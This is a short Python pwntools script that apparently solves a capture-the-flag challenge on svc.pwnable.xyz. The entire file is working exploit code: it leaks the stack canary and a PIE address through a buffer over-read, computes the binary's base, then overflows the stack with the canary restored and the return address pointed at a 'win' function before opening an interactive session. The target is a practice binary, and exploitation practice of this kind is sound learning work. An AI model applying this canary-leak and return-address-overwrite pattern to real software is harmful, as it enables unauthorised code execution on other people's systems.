from pwn import *


win_offset = 0xd30


debug = 0
if not debug:
    sh = remote('svc.pwnable.xyz',30027)
else:
    sh = process('./challenge')



'''
=====================================================
                    LEAK CANARY 
=====================================================
'''

sh.recvuntil('> ')
kapa = sh.recvline()
while (len(kapa) < 112):
    sh.sendafter('you > ', "AAAA")
    sh.recvuntil('> ')
    kapa = sh.recvline()


payload = "A"*0x68 + "B"
sh.sendafter('> ', payload)
sh.recvuntil('A'*0x68)
canary = u64(sh.recv(8)) - ord('B')
log.info('Canary : {}'.format(hex(canary)))

'''
=====================================================
                   LEAK PIE
=====================================================                
'''

sh.recvuntil('> ')
kapa = sh.recvline()
while (len(kapa) < 121):
    sh.sendafter('you > ', "AAAA")
    sh.recvuntil('> ')
    kapa = sh.recvline()

payload = "A"*0x78
sh.sendafter('you > ', payload)
sh.recvuntil('A'*0x78)
pie = u64((sh.recv(6)).ljust(8, '\x00'))
log.info('PIE : {}'.format(hex(pie)))
offset = 0x1081
base = pie - offset
win_addr = base + win_offset
print "base = ", hex(base)
log.info('WIN : {}'.format(hex(win_addr)))


'''
===================================================
        CHANGE RETURN ADDRESS TO WIN
===================================================
'''

sh.recvuntil('> ')
kapa = sh.recvline()
while (len(kapa) < 128):
    payload = "AAAA"
    sh.sendafter('you > ', payload)
    sh.recvuntil(': ')
    sh.recvuntil('> ');
    kapa = sh.recvline()

payload = "A"*0x68 + p64(canary) + "B"*8 + p64(win_addr)
sh.sendafter('you > ', payload)

sh.sendafter('you > ', 'exit')

sh.interactive()
